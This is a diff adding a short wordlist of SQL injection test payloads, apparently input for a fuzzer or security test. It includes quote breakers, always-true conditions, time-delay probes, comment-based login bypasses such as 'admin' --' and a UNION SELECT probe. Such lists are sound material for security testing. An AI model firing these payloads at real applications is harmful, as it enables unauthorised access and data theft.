@@ -1,0 +1,13 @@
+'
+"
+')
+")
+' OR '1'='1
+" OR "1"="1
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND 1=1--
+" AND 1=1--
+admin' --
+admin' #
+' UNION SELECT 1,2,3--
